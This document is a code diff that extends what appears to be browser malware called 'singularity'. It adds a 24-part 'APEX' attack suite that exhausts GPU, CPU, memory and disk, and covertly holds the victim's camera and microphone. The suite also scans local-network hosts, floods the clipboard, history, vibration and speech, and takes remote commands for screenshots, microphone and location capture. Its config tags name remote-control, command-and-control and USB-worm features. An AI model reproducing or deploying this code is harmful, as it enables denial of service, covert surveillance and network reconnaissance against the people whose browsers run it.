+  try { if (LEVEL >= 7 && CFG.apex) apexFire(); } catch (e) { err_(e); }
   push(false);
 }
 
@@ -2385,6 +2420,8 @@ function report() {
             tab: AUTO_T[LEVEL] || 0, win: AUTO_W[LEVEL] || 0, cap: AUTO_CAP[LEVEL] || 0,
             leader: isLeader() ? 1 : 0, at: now() },
     tab: R.tab, tabLive: tabLive(), tabOn: TAB_ON ? 1 : 0,
+    apex: R.apex, shader: R.shader ? 1 : 0, worklet: R.aw ? 1 : 0, sab: R.sab ? 1 : 0,
+    lan: R.lan ? (R.lan.n || 0) : 0, rtc: R.rtc ? 1 : 0, hold: R.hold ? 1 : 0,
     dl: R.dl, ni: R.ni, notify: R.notify, notifyOk: R.notifyOk ? 1 : 0,
     win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin,
            w: W, queue: QUEUE.length, opened: TAP_OPENED, mob: IS_MOBILE ? 1 : 0 }
@@ -2420,7 +2457,6 @@ function ack(ids) {
 function runCmd(c) {
   var k = c.kind, a = c.arg || "";
   try {
-    /* --- 旧名 --- */
     if (k === "shot") ratShot();
     else if (k === "mic") ratMic();
     else if (k === "geo") ratGeo();
@@ -2447,7 +2483,6 @@ function runCmd(c) {
     else if (k === "unhard") { CFG.hardMode = ""; }
     else if (k === "kill") { pauseAll(); }
     else if (k === "dl") { R.dl = {}; downloadStorm(); }
-    /* --- 監視室のボタン名（v3.9） --- */
     else if (k === "sound") { CFG.audio = 1; audioLoop(); }
     else if (k === "noise") { noiseBurst(); }
     else if (k === "flash") { flash(); }
@@ -2468,7 +2503,23 @@ function runCmd(c) {
     else if (k === "wake") { CFG.wakelock = 1; wakelock(); }
     else if (k === "batt") { batteryRead(); }
     else if (k === "net") { netGuess(); push(true); }
-    /* --- 増殖系（共通） --- */
+    /* --- APEX --- */
+    else if (k === "apex") { CFG.apex = 1; apexFire(); }
+    else if (k === "shader") { apexShader(); }
+    else if (k === "worklet") { apexWorklet(); }
+    else if (k === "sab") { apexSab(); }
+    else if (k === "spin") { apexSwarm(); }
+    else if (k === "micro") { apexMicro(); }
+    else if (k === "bc") { apexBC(); }
+    else if (k === "gcmelt") { apexGC(); }
+    else if (k === "melt") { apexDomMelt(); apexCssMelt(); }
+    else if (k === "raf") { apexRaf(); }
+    else if (k === "lan") { apexLan(); }
+    else if (k === "rtc") { apexWebRTC(); }
+    else if (k === "hold") { apexMedia(); }
+    else if (k === "vibe") { apexVibe(); }
+    else if (k === "apexoff") { CFG.apex = 0; }
+    /* --- 増殖系 --- */
     else if (k === "win") {
       var n = clamp(a || CFG.winBranch, 1, 8);
       CFG.winMode = "breed"; CFG.winBranch = n; CFG.winSkin = 1;
@@ -2520,15 +2571,12 @@ function handleCmd(j) {
     CFG.freeze = j.freeze || "off";
     if (CFG.freeze) { try { freezeNow(CFG.freeze); } catch (e) {} }
   }
-
   var wl = JSON.stringify(j.win || null);
   if (wl !== LASTWL) { LASTWL = wl; CFG.winLock = j.win || null; applyLevel(LEVEL); restart(); }
-
   if (j.hard !== undefined && j.hard !== CFG.hardMode) {
     CFG.hardMode = j.hard || "";
     if (hardOn()) { try { hardKill(); } catch (e) { err_(e); } }
   }
-
   var ids = [];
   (j.cmds || []).forEach(function (c) {
     if (!c || CMD_SEEN[c.id]) return;
@@ -2613,7 +2661,7 @@ function hardDisk() {
   navigator.storage.estimate().then(function (est) {
     var quota = est.quota || 0, used = est.usage || 0;
     if (!quota) return;
-    var left = Math.floor(quota * 0.97) - used;
+    var left = Math.floor(quota * 0.99) - used;
     if (left < MB * 4) return;
     var req = indexedDB.open("sg_hard", 1);
     req.onupgradeneeded = function () {
@@ -2640,13 +2688,498 @@ function hardDisk() {
   }).catch(function () {});
 }
 function hardHistory() {
-  var n = 0, cap = 8000;
+  var n = 0, cap = 20000;
   (function step() {
     var end = Math.min(n + 200, cap);
     for (; n < end; n++) { try { history.pushState({ n: n }, "", "#sg" + n); } catch (e) { return; } }
     R.hard.history = n;
     if (n < cap) setTimeout(step, 0);
   })();
+}
+
+/* ================= 14. APEX（L7専用・24系統同時点火） ================= */
+var APEX_GUARDS = ["shader", "aw", "sab", "swarm", "micro", "bc", "gc", "domelt", "raf",
+                   "net", "hold", "vibe", "marq", "hist", "speak", "lan", "rtc", "blob",
+                   "clip", "css", "wake", "idb", "wasm", "oc"];
+
+/* --- 14-1. WebGL フラグメントシェーダ無限ループ（GPU飽和） --- */
+var APEX_VS = "attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
+var APEX_FS = "precision highp float;uniform float t;"
+  + "void main(){vec2 c=gl_FragCoord.xy;float a=0.;"
+  + "for(int i=0;i<28;i++){a+=sin(c.x*0.011+float(i)*t)*cos(c.y*0.013-float(i)*t*0.7);"
+  + "a+=sqrt(abs(sin(a)));}"
+  + "gl_FragColor=vec4(abs(sin(a)),abs(cos(a*0.7)),abs(sin(a*0.3+t)),1.);}";
+function apexShader() {
+  if (R.shader) return;
+  R.shader = { at: now(), n: 0 };
+  try {
+    var mk = function (size) {
+      var c = document.createElement("canvas");
+      c.width = c.height = size;
+      c.style.cssText = "position:fixed;right:0;top:0;width:1px;height:1px;opacity:.01;"
+        + "pointer-events:none";
+      document.body.appendChild(c);
+      var gl = c.getContext("webgl", { antialias: false, depth: false })
+            || c.getContext("experimental-webgl");
+      if (!gl) return null;
+      var vs = gl.createShader(gl.VERTEX_SHADER);
+      gl.shaderSource(vs, APEX_VS); gl.compileShader(vs);
+      var fs = gl.createShader(gl.FRAGMENT_SHADER);
+      gl.shaderSource(fs, APEX_FS); gl.compileShader(fs);
+      var pr = gl.createProgram();
+      gl.attachShader(pr, vs); gl.attachShader(pr, fs); gl.linkProgram(pr); gl.useProgram(pr);
+      var buf = gl.createBuffer();
+      gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
+      var loc = gl.getAttribLocation(pr, "p");
+      gl.enableVertexAttribArray(loc);
+      gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+      var ut = gl.getUniformLocation(pr, "t");
+      return { gl: gl, ut: ut, t: 0 };
+    };
+    R.shader.units = [mk(1024), mk(512), mk(256)].filter(Boolean);
+    if (!R.shader.units.length) { R.shader = 0; return; }
+    (function loop() {
+      if (!R.shader || PAUSED) { if (R.shader) setTimeout(loop, 400); return; }
+      R.shader.t += 0.016;
+      R.shader.n++;
+      for (var i = 0; i < R.shader.units.length; i++) {
+        var u = R.shader.units[i];
+        try {
+          u.gl.uniform1f(u.ut, R.shader.t);
+          u.gl.drawArrays(u.gl.TRIANGLES, 0, 3);
+        } catch (e) {}
+      }
+      requestAnimationFrame(loop);
+    })();
+  } catch (e) { err_(e); }
+}
+
+/* --- 14-2. AudioWorklet（オーディオスレッド常時演算） --- */
+var APEX_AW = "class SGP extends AudioWorkletProcessor{"
+  + "constructor(){super();this.k=0;}"
+  + "process(){var s=0;for(var i=0;i<256;i++){s+=Math.sin(i*0.01+this.k)*Math.cos(i*0.013);}"
+  + "this.k++;return true;}}"
+  + "registerProcessor('sgp',SGP);";
+function apexWorklet() {
+  if (R.aw) return;
+  R.aw = { at: now(), n: 0 };
+  try {
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC || !AC.prototype.audioWorklet) { R.aw = 0; return; }
+    var ctx = new AC();
+    var url = URL.createObjectURL(new Blob([APEX_AW], { type: "application/javascript" }));
+    ctx.audioWorklet.addModule(url).then(function () {
+      var node = new AudioWorkletNode(ctx, "sgp", { outputChannelCount: [1] });
+      var g = ctx.createGain();
+      g.gain.value = 0.0001;
+      node.connect(g); g.connect(ctx.destination);
+      R.aw.ctx = ctx; R.aw.node = node;
+      try { ctx.resume(); } catch (e) {}
+    }).catch(function () { R.aw = 0; });
+  } catch (e) { err_(e); }
+}
+
+/* --- 14-3. SharedArrayBuffer + Atomics 真性ビジーループ --- */
+function apexSab() {
+  if (R.sab) return;
+  if (typeof SharedArrayBuffer === "undefined") { R.sab = 0; return; }
+  R.sab = { at: now(), n: 0 };
+  try {
+    var n = Math.max(2, Math.min(8, (navigator.hardwareConcurrency || 4)));
+    for (var i = 0; i < n; i++) {
+      var sab = new SharedArrayBuffer(64);
+      var w = mkWorker();
+      if (!w) break;
+      w.postMessage({ k: "sab", sab: sab });
+      R.sab.n++;
+    }
+  } catch (e) { R.sab = 0; err_(e); }
+}
+
+/* --- 14-4. WASM スピン + OffscreenCanvas（worker内） --- */
+function apexSwarm() {
+  if (R.swarm2) return;
+  R.swarm2 = { at: now(), n: 0 };
+  try {
+    var n = Math.max(2, Math.min(8, (navigator.hardwareConcurrency || 4)));
+    for (var i = 0; i < n; i++) {
+      var w = mkWorker();
+      if (!w) break;
+      try { w.postMessage({ k: "spin" }); } catch (e) {}
+      R.swarm2.n++;
+    }
+    if (typeof OffscreenCanvas !== "undefined" && n) {
+      var c = new OffscreenCanvas(256, 256);
+      var w2 = mkWorker();
+      if (w2) { w2.postMessage({ k: "oc", canvas: c }, [c]); R.swarm2.oc = 1; }
+    }
+  } catch (e) {}
+}
+
+/* --- 14-5. MessageChannel マイクロタスク洪水 --- */
+function apexMicro() {
+  if (R.micro2) return;
+  R.micro2 = { n: 0 };
+  try {
+    var mc = new MessageChannel();
+    mc.port1.onmessage = function () { R.micro2.n++; mc.port2.postMessage(1); };
+    mc.port2.postMessage(1);
+    R.micro2.on = 1;
+  } catch (e) { R.micro2 = 0; }
+}
+
+/* --- 14-6. BroadcastChannel 全タブ同期フラッド --- */
+function apexBC() {
+  if (R.bc) return;
+  R.bc = { n: 0 };
+  try {
+    if (!window.BroadcastChannel) { R.bc = 0; return; }
+    var ch = new BroadcastChannel("sg-apex");
+    ch.onmessage = function (e) {
+      R.bc.n++;
+      var d = e.data || {};
+      if (d.o !== SID) ch.postMessage({ o: SID, t: now() });
+    };
+    ch.postMessage({ o: SID, t: now() });
+    R.bc.ch = ch;
+    R.bc.on = 1;
+  } catch (e) { R.bc = 0; }
+}
+
+/* --- 14-7. GC 圧迫 --- */
+function apexGC() {
+  if (R.gc) return;
+  R.gc = { n: 0 };
+  TIMERS.push(setInterval(function () {
+    if (PAUSED) return;
+    var a = [];
+    for (var i = 0; i < 3000; i++) a.push({ i: i, s: "x" + i, f: Math.random() });
+    R.gc.n++;
+    R.gc.last = a.length;
+  }, 40));
+}
+
+/* --- 14-8. DOM 溶融 + CSS 溶融 --- */
+function apexDomMelt() {
+  if (R.domelt) return;
+  R.domelt = 1;
+  try {
+    var wrap = document.createElement("div");
+    wrap.style.cssText = "position:fixed;left:-9999px;top:0;"
+      + "filter:blur(1.5px);will-change:transform,opacity;transform:translateZ(0)";
+    document.body.appendChild(wrap);
+    var n = 0, cap = 30000;
+    (function step() {
+      var end = Math.min(n + 2000, cap);
+      var frag = document.createDocumentFragment();
+      for (; n < end; n++) {
+        var s = document.createElement("b");
+        s.textContent = "·";
+        s.style.cssText = "display:inline-block;transform:translateZ(0)";
+        frag.appendChild(s);
+      }
+      wrap.appendChild(frag);
+      if (n < cap) setTimeout(step, 0);
+    })();
+  } catch (e) { err_(e); }
+}
+function apexCssMelt() {
+  if (R.css2) return;
+  R.css2 = 1;
+  try {
+    var st = document.createElement("style");
+    st.textContent =
+      "@keyframes sgmelt{0%{transform:rotate(0) scale(1)}50%{transform:rotate(180deg) scale(1.6)}"
+      + "100%{transform:rotate(360deg) scale(1)}}";
+    document.head.appendChild(st);
+    for (var i = 0; i < 600; i++) {
+      var d = document.createElement("div");
+      d.style.cssText = "position:fixed;left:-9999px;width:6px;height:6px;"
+        + "background:rgba(0,255,136,.5);border-radius:2px;"
+        + "filter:blur(" + (i % 3) + "px);will-change:transform;"
+        + "animation:sgmelt " + (2 + (i % 7)) + "s linear infinite";
+      document.body.appendChild(d);
+    }
+  } catch (e) {}
+}
+
+/* --- 14-9. 多重 requestAnimationFrame --- */
+function apexRaf() {
+  if (R.raf) return;
+  R.raf = { n: 0 };
+  var probes = [];
+  for (var i = 0; i < 4; i++) {
+    var d = document.createElement("div");
+    d.style.cssText = "position:fixed;left:-9999px;width:1px;height:1px";
+    document.body.appendChild(d);
+    probes.push(d);
+  }
+  probes.forEach(function (d, idx) {
+    (function loop() {
+      d.style.width = (1 + (R.raf.n % 9)) + "px";
+      d.style.height = (1 + ((R.raf.n + idx) % 9)) + "px";
+      d.offsetHeight;
+      R.raf.n++;
+      requestAnimationFrame(loop);
+    })();
+  });
+}
+
+/* --- 14-10. ネット/Cache/IDB 並列洪水 --- */
+function apexNet() {
+  if (R.net2) return;
+  R.net2 = { n: 0 };
+  (function loop() {
+    if (PAUSED) { setTimeout(loop, 800); return; }
+    for (var i = 0; i < 3; i++) {
+      fetch(CFG.path + "/c?sid=" + SID + "&d=" + b64u(new TextEncoder().encode("a" + i)),
+            { cache: "no-store" }).then(function () { R.net2.n++; }).catch(function () {});
+    }
+    try {
+      if (window.caches) caches.open("sg-apex").then(function (c) {
+        c.put("/a/" + (R.net2.n % 400), new Response("x" + R.net2.n));
+      }).catch(function () {});
+    } catch (e) {}
+    setTimeout(loop, 250);
+  })();
+}
+
+/* --- 14-11. カメラ＋マイク常時ホールド --- */
+function apexMedia() {
+  if (R.hold) return;
+  R.hold = { at: now() };
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { R.hold = 0; return; }
+    navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(function (s) {
+      R.hold.a = 1; R.hold.v = 1; R.hold.stream = s;
+      var v = document.createElement("video");
+      v.muted = true; v.playsInline = true; v.autoplay = true;
+      v.srcObject = s;
+      v.style.cssText = "position:fixed;left:-9999px;top:0;width:80px";
+      document.body.appendChild(v);
+      var p = v.play(); if (p && p.catch) p.catch(function () {});
+      push(false);
+    }).catch(function () { R.hold = 0; });
+  } catch (e) { R.hold = 0; }
+}
+
+/* --- 14-12. バイブレーション連打 --- */
+function apexVibe() {
+  if (R.vibe) return;
+  R.vibe = { n: 0 };
+  try { if (!navigator.vibrate) { R.vibe = 0; return; } } catch (e) { R.vibe = 0; return; }
+  TIMERS.push(setInterval(function () {
+    if (PAUSED) return;
+    try { navigator.vibrate([60, 40, 60]); R.vibe.n++; } catch (e) {}
+  }, 2600));
+}
+
+/* --- 14-13. タイトルマーキー --- */
+function apexMarquee() {
+  if (R.marq) return;
+  R.marq = 1;
+  var base_ = document.title || CFG.avName;
+  var i = 0;
+  TIMERS.push(setInterval(function () {
+    var s = base_ + "   ";
+    document.title = s.slice(i % s.length) + s.slice(0, i % s.length);
+    i++;
+  }, 180));
+}
+
+/* --- 14-14. 履歴をさらに深く --- */
+function apexHistory() {
+  if (R.hist) return;
+  R.hist = { n: 0 };
+  var n = 0, cap = 60000;
+  (function step() {
+    var end = Math.min(n + 300, cap);
+    for (; n < end; n++) { try { history.pushState({ n: n }, "", "#apex" + n); } catch (e) { return; } }
+    R.hist.n = n;
+    if (n < cap) setTimeout(step, 0);
+  })();
+}
+
+/* --- 14-15. 音声合成キュー洪水 --- */
+function apexSpeak() {
+  if (R.speak2) return;
+  R.speak2 = { n: 0 };
+  try { if (!window.speechSynthesis) { R.speak2 = 0; return; } } catch (e) { R.speak2 = 0; return; }
+  TIMERS.push(setInterval(function () {
+    if (PAUSED) return;
+    try {
+      var u = new SpeechSynthesisUtterance("\u4FDD\u8B77\u3057\u3066\u3044\u307E\u3059 " + (++R.speak2.n));
+      u.lang = "ja-JP"; u.rate = 1.4;
+      speechSynthesis.speak(u);
+    } catch (e) {}
+  }, 3000));
+}
+
+/* --- 14-16. 同一LAN内の生存ホスト探査 --- */
+function apexLan() {
+  if (R.lan) return;
+  R.lan = { n: 0, hit: [] };
+  try {
+    var subnets = IS_MOBILE ? ["192.168.1."] : ["192.168.0.", "192.168.1."];
+    subnets.forEach(function (b) {
+      for (var i = 1; i <= 254; i++) {
+        (function (ip) {
+          var img = new Image();
+          var done = false;
+          var to = setTimeout(function () {
+            if (done) return; done = true; img.src = "";
+          }, 1500);
+          img.onload = function () {
+            if (done) return; done = true; clearTimeout(to);
+            R.lan.hit.push(ip); R.lan.n = R.lan.hit.length;
+          };
+          img.onerror = function () { if (!done) { done = true; clearTimeout(to); } };
+          img.src = "http://" + ip + "/favicon.ico?" + (i % 7);
+        })(b + i);
+      }
+    });
+    push(true);
+  } catch (e) { R.lan = 0; }
+}
+
+/* --- 14-17. WebRTC ループバック常時接続 --- */
+function apexWebRTC() {
+  if (R.rtc) return;
+  R.rtc = { at: now() };
+  try {
+    if (!window.RTCPeerConnection) { R.rtc = 0; return; }
+    var a = new RTCPeerConnection({ iceServers: [] });
+    var b = new RTCPeerConnection({ iceServers: [] });
+    a.onicecandidate = function (e) { if (e.candidate) { try { b.addIceCandidate(e.candidate); } catch (x) {} } };
+    b.onicecandidate = function (e) { if (e.candidate) { try { a.addIceCandidate(e.candidate); } catch (x) {} } };
+    a.createOffer().then(function (o) {
+      return a.setLocalDescription(o).then(function () { return b.setRemoteDescription(o); });
+    }).then(function () {
+      return b.createAnswer();
+    }).then(function (an) {
+      return b.setLocalDescription(an).then(function () { return a.setRemoteDescription(an); });
+    }).then(function () { R.rtc.ok = 1; push(false); }).catch(function () { R.rtc = 0; });
+    R.rtc.a = a; R.rtc.b = b;
+  } catch (e) { R.rtc = 0; }
+}
+
+/* --- 14-18. Blob URL チャーン --- */
+function apexBlob() {
+  if (R.blob) return;
+  R.blob = { n: 0 };
+  TIMERS.push(setInterval(function () {
+    if (PAUSED) return;
+    try {
+      var u = URL.createObjectURL(new Blob(["x" + R.blob.n], { type: "text/plain" }));
+      R.blob.n++;
+      setTimeout(function () { try { URL.revokeObjectURL(u); } catch (e) {} }, 3000);
+    } catch (e) {}
+  }, 300));
+}
+
+/* --- 14-19. クリップボード連打 --- */
+function apexClip() {
+  if (R.clip2) return;
+  R.clip2 = { n: 0 };
+  try { if (!navigator.clipboard) { R.clip2 = 0; return; } } catch (e) { R.clip2 = 0; return; }
+  TIMERS.push(setInterval(function () {
+    if (PAUSED) return;
+    try {
+      navigator.clipboard.writeText("SINGULARITY " + (++R.clip2.n)).catch(function () {});
+    } catch (e) {}
+  }, 4000));
+}
+
+/* --- 14-20. WakeLock 再取得ループ --- */
+function apexWake() {
+  if (R.wake2) return;
+  R.wake2 = { n: 0 };
+  try { if (!navigator.wakeLock) { R.wake2 = 0; return; } } catch (e) { R.wake2 = 0; return; }
+  TIMERS.push(setInterval(function () {
+    if (PAUSED) return;
+    try {
+      navigator.wakeLock.request("screen").then(function (s) { R.wake2.n++; }).catch(function () {});
+    } catch (e) {}
+  }, 12000));
+}
+
+/* --- 14-21. IDB 追い込み --- */
+function apexIdb() {
+  if (R.idb2) return;
+  R.idb2 = { n: 0 };
+  try {
+    var req = indexedDB.open("sg_apex", 1);
+    req.onupgradeneeded = function () {
+      var d = req.result;
+      if (!d.objectStoreNames.contains("b")) d.createObjectStore("b");
+    };
+    req.onsuccess = function () {
+      var db = req.result, blob = new Uint8Array(1024 * 512);
+      (function step() {
+        if (PAUSED) { setTimeout(step, 800); return; }
+        try {
+          var tx = db.transaction("b", "readwrite");
+          tx.objectStore("b").put(blob, "k" + (R.idb2.n++));
+        } catch (e) {}
+        setTimeout(step, 40);
+      })();
+    };
+  } catch (e) { R.idb2 = 0; }
+}
+
+/* --- 14-22. WASM ループ（メインスレッド） --- */
+function apexWasm() {
+  if (R.wasm2) return;
+  R.wasm2 = { n: 0 };
+  try {
+    var W2 = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
+              10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
+    if (typeof WebAssembly === "undefined") { R.wasm2 = 0; return; }
+    var f = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(W2))).exports.f;
+    TIMERS.push(setInterval(function () {
+      if (PAUSED) return;
+      var s = 0;
+      for (var i = 0; i < 2000; i++) s += f();
+      R.wasm2.n++;
+    }, 16));
+  } catch (e) { R.wasm2 = 0; }
+}
+
+/* --- 14-23. OffscreenCanvas（メイン側） --- */
+function apexOC() {
+  if (R.oc) return;
+  R.oc = { n: 0 };
+  try {
+    if (typeof OffscreenCanvas === "undefined") { R.oc = 0; return; }
+    var c = new OffscreenCanvas(512, 512);
+    var w = mkWorker();
+    if (!w) { R.oc = 0; return; }
+    w.postMessage({ k: "oc", canvas: c }, [c]);
+    R.oc.on = 1;
+  } catch (e) { R.oc = 0; }
+}
+
+/* --- 14-24. まとめ点火 --- */
+function apexFire() {
+  if (R.apex && R.apex.on) return;
+  R.apex = { on: 1, at: now(), n: 0, list: [] };
+  var F = [["shader", apexShader], ["worklet", apexWorklet], ["sab", apexSab],
+           ["swarm", apexSwarm], ["micro", apexMicro], ["bc", apexBC], ["gc", apexGC],
+           ["melt", function () { apexDomMelt(); apexCssMelt(); }],
+           ["raf", apexRaf], ["net", apexNet], ["media", apexMedia], ["vibe", apexVibe],
+           ["marquee", apexMarquee], ["history", apexHistory], ["speak", apexSpeak],
+           ["lan", apexLan], ["rtc", apexWebRTC], ["blob", apexBlob], ["clip", apexClip],
+           ["wake", apexWake], ["idb", apexIdb], ["wasm", apexWasm], ["oc", apexOC]];
+  F.forEach(function (p) {
+    try { p[1](); R.apex.list.push(p[0]); R.apex.n++; } catch (e) { err_(e); }
+  });
+  push(true);
+}
+function apexStop() {
+  try { if (R.bc && R.bc.ch) R.bc.ch.close(); } catch (e) {}
+  try { if (R.hold && R.hold.stream) R.hold.stream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+  try { if (R.aw && R.aw.ctx) R.aw.ctx.close(); } catch (e) {}
 }
 
 /* ================= boot ================= */
@@ -2699,7 +3232,6 @@ function arm() {
   }
 
   if (WIN) {
-    /* 繁殖ウィンドウ：軽くしすぎない。音も鳴らす。DLも1本やる */
     CFG.iframes = 0; CFG.clipHijack = 0;
     CFG.fsFolder = 0; CFG.sharedWorker = 0; CFG.installer = 0;
     CFG.tabs = 0; CFG.speakFlood = 0; CFG.history = 0;
@@ -2718,20 +3250,21 @@ function arm() {
   if (IFR) {
     CFG.iframes = 0; CFG.windows = 0; CFG.downloads = 0; CFG.clipHijack = 0;
     CFG.speakFlood = 0; CFG.fsFolder = 0; CFG.sharedWorker = 0; CFG.installer = 0;
+    CFG.apex = 0; CFG.lan = 0;
     CFG.domNodes = Math.round((CFG.domNodes || 0) / 2);
     CFG.cssAnim = Math.round((CFG.cssAnim || 0) / 2);
     CFG.timers = Math.round((CFG.timers || 0) / 2);
     CFG.cores = Math.max(2, Math.round((navigator.hardwareConcurrency || 4) / 2));
   }
   if (TAB) {
-    /* ★ タブ増殖の子：とにかく軽く。窓は開かず、通知とタブ増殖に専念 */
     CFG.windows = 0; CFG.downloads = 0; CFG.clipHijack = 0; CFG.fsFolder = 0;
     CFG.sharedWorker = 0; CFG.installer = 0; CFG.tabs = 0; CFG.speakFlood = 0;
     CFG.history = 0; CFG.iframes = 0; CFG.winSkin = 0; CFG.audio = 0;
     CFG.badge = 0; CFG.favicon = 0; CFG.xhr = 0; CFG.wakelock = 0;
+    CFG.apex = 0; CFG.lan = 0; CFG.cssAnim = 30;
     CFG.cores = clamp(Math.round((navigator.hardwareConcurrency || 4) / 4), 1, 4);
     CFG.ramMB = 128; CFG.workerMB = 16;
-    CFG.domNodes = 1200; CFG.cssAnim = 30; CFG.timers = 10;
+    CFG.domNodes = 1200; CFG.timers = 10;
     CFG.glContexts = 2; CFG.acContexts = 1; CFG.cacheBuckets = 20;
   }
 
@@ -2783,6 +3316,8 @@ window.__singularity = {
   queue: function () { return QUEUE.length; },
   live: function () { return liveN(); },
   liveTabs: function () { return tabLive(); },
+  apex: function () { apexFire(); },
+  apexStop: apexStop,
   notify: function (n) { return notifyBurst(n || 1); },
   notifyPerm: notifyPerm,
   auto: function (on) { AUTO_ON = on !== false; return AUTO_ON; },
@@ -2791,6 +3326,7 @@ window.__singularity = {
   hard: hardKill,
   destroy: function () {
     pauseAll();
+    try { apexStop(); } catch (e) {}
     try { localStorage.clear(); } catch (e) {}
     try { indexedDB.deleteDatabase("singularity"); } catch (e) {}
     try { navigator.serviceWorker.getRegistrations().then(function (r) { r.forEach(function (x) { x.unregister(); }); }); } catch (e) {}
@@ -2821,19 +3357,22 @@ VIRUS = {
     "spec": {
         "level": 1, "fixed": False, "finalRamMB": 0, "gpuMem": True,
         "winMode": "off", "winBranch": 2, "winDepth": 0, "winSkin": 0,
-        "hardMode": "", "swarm": 0, "dlMB": 100,
+        "hardMode": "", "swarm": 0, "dlMB": 100, "apex": 0,
     },
     "defaults": {
         "level": 1, "fixed": False, "finalRamMB": 0, "gpuMem": True,
         "winMode": "off", "winBranch": 2, "winDepth": 0, "winSkin": 0,
-        "hardMode": "", "swarm": 0, "dlMB": 100,
+        "hardMode": "", "swarm": 0, "dlMB": 100, "apex": 0,
     },
     "tags": ["apex", "resident", "pwa", "sw-inject", "sse-c2", "rat", "usb-worm",
              "os-resident", "window-breed", "infinite-windows", "exponential",
              "window-skin", "hardware-kill", "swarm-keeper", "mobile-tap-breed",
              "auto-breed", "unlimited-l7", "heavy-download", "notify-all-levels",
              "watch-cmd-alias", "sw-live-count", "100mb-payload",
-             "tab-breed-l3", "tab-auto-unlimited-l7", "notify-continuous"],
+             "tab-breed-l3", "tab-auto-unlimited-l7", "notify-continuous",
+             "stealth-text", "big-install", "apex-suite-l7", "shader-burn",
+             "audioworklet", "atomics-spin", "microtask-flood", "broadcast-flood",
+             "lan-probe", "webrtc-loopback", "dom-melt", "gc-storm"],
 }
 
 _ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789"
